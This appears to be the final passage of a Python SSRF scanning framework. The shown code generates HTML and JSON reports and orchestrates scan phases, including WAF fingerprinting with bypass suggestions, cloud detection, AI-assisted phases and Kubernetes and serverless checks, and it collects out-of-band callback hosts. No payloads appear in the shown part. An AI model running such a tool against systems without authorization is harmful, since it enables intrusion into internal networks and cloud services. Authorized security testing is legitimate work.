                    unique=len(deduped), callbacks=len(self.callbacks), vulns=vulns)
        with open(self.html_file,"w") as f:
            f.write(html)
        if self.verbose: print(f"  {OK} HTML report: {self.html_file}")

    async def save_json(self):
        data = {
            "target": self.target, "time": datetime.now().isoformat(),
            "cloud": self.cloud,
            "endpoints": [{"path":e.path,"method":e.method,"params":list(e.params)} for e in self.endpoints],
            "evidence": [asdict(ev) for ev in self.evidence],
            "callbacks": dict(self.callbacks),
            "internal_ips": list(self.internal_ips)
        }
        with open(self.json_file,"w") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)

    def print_summary(self):
        deduped = self._dedup()
        print(f"\n{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"{BOLD}{GREEN}  SCAN COMPLETE - {self.target}{RESET}")
        print(f"{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"  Cloud: {', '.join(self.cloud) if self.cloud else 'Unknown'}")
        print(f"  Endpoints: {len(self.endpoints)}")
        print(f"  Findings: {len(self.evidence)} raw / {len(deduped)} unique")
        print(f"  Callbacks: {len(self.callbacks)}")
        for (ep, param), info in list(deduped.items())[:10]:
            sev = info["max_sev"]
            col = {"critical":RED,"high":YELLOW,"medium":MAGENTA}.get(sev, BLUE)
            print(f"  {col}[{sev.upper()}]{RESET} {ep} → {param} ({info['oob']} callbacks)")
        print(f"\n  {DIM}Report: {self.html_file}{RESET}")
        print(f"  {DIM}Results: {self.json_file}{RESET}")

    async def run(self):
        print(f"\n{BOLD}{'='*50}{RESET}")
        print(f"{BOLD}Target:{RESET} {self.target}")
        print(f"{BOLD}Callback:{RESET} {self.cb}")
        print(f"{BOLD}{'='*50}{RESET}")
        await self.start()
        try:
            await self.discover()
            if not self.no_waf:
                s, b, h = await self.request("GET", self.base)
                self.waf_info = self.waf.fingerprint(h, b)
                if self.verbose:
                    if self.waf_info.get("detected"):
                        print(f"\n{CYAN}[WAF]{RESET} Detected: {YELLOW}{self.waf_info['primary']}{RESET} ({self.waf_info['confidence']:.0f}%)")
                        bypass = self.waf_info.get("bypass_suggestions",[])
                        if bypass: print(f"  {DIM}Bypass: {', '.join(bypass[:3])}{RESET}")
                    else:
                        print(f"\n{CYAN}[WAF]{RESET} None detected")
            await self.detect_cloud()
            await self.basic()
            await self.run_ai_phases()
            await self.phase_websocket()
            await self.phase_grpc()
            await self.phase_k8s()
            await self.phase_serverless()
            self.export_nuclei()
            self.export_siem_cef()
            self.export_json_api()
            self.generate_attack_map()
            await self.generate_html()
            await self.save_json()
            self.print_summary()
        finally:
            await self.stop()

async def main():
    parser = setup_argparse()
    args = parser.parse_args()
    print(BANNER)

    targets = TargetManager.from_args(args)
    if not targets:
        targets = TargetManager.interactive()
        if not targets:
            print(f"{FAIL} No targets.")
            return
        if not args.callback and not args.collaborator and not args.burp_collaborator:
            print(f"\n{BOLD}{CYAN}OOB CALLBACK SELECTION{RESET}")
            print("  1 - Default local placeholder")
            print("  2 - Burp Collaborator")
            print("  3 - Interactsh / OASTify / Custom OAST host")
            cb_choice = input(f"{WARN} Choose [1/2/3] [1]: ").strip() or "1"
            if cb_choice == "2":
                args.burp_collaborator = input("Burp Collaborator host: ").strip()
            elif cb_choice == "3":
                args.collaborator = input("Callback/OAST host: ").strip()

        if args.ai_provider is None:
            enable_ai = input(f"{WARN} Enable AI? (none/claude/openai/ollama/gemini/mistral/deepseek) [none]: ").strip().lower()
            if enable_ai and enable_ai != "none":
                args.ai_provider = enable_ai
                if enable_ai != "ollama":
                    args.ai_key = input(f"{WARN} API key: ").strip()
                model_choice = input(f"{WARN} Model (press Enter for default): ").strip()
                if model_choice:
                    args.ai_model = model_choice

    for i, t in enumerate(targets, 1):
        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}]{RESET} Scanning: {t}")
        await UltimateSSRFFramework(t, args).run()
        if i < len(targets):
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
